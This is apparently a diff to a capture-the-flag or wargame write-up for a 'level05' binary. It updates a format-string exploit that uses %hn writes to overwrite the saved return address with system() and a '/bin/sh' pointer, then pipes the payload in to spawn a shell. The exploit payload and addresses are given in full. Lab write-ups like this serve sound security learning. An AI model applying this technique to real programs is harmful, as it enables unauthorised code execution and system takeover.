@@ -31,16 +31,16 @@ address of system(): 0xf7e6aed0
     f7e6 = 63462 = $10
     aed0 = 44752 = $11
 
-0xffffd57c <- &system
-    \x7c\xd5\xff\xff
-    \x7e\xd5\xff\xff
-0xffffd584 <- &"/bin/sh"
-    \x84\xd5\xff\xff
-    \x86\xd5\xff\xff
+EIP: 0xffffd66c <- &system
+    \x6c\xd6\xff\xff
+    \x6e\xd6\xff\xff
+system arg: 0xffffd674 <- &"/bin/sh"
+    \x74\xd6\xff\xff
+    \x76\xd6\xff\xff
 
 $ echo -e '[EIP second part] [EIP first part] [system() arg second part] [system() arg first part] [display 0x97ec char] %13$hn [display 0xaed0 char] %11$hn [display 0xf7e6 char] %10$hn [display 0xf7f8 char] %12$hn' > /tmp/level05_pcode
 
-$ echo -e '\x7e\xd5\xff\xff\x7c\xd5\xff\xff\x86\xd5\xff\xff\x84\xd5\xff\xff%38876c%13$hn%5860c%11$hn%18710c%10$hn%18c%12$hn' > /tmp/level05_pcode
+$ echo -e '\x6e\xd6\xff\xff\x6c\xd6\xff\xff\x76\xd6\xff\xff\x74\xd6\xff\xff%38876c%13$hn%5860c%11$hn%18710c%10$hn%18c%12$hn' > /tmp/level05_pcode
 
 
 $ cat /tmp/level05_pcode - | ./level05
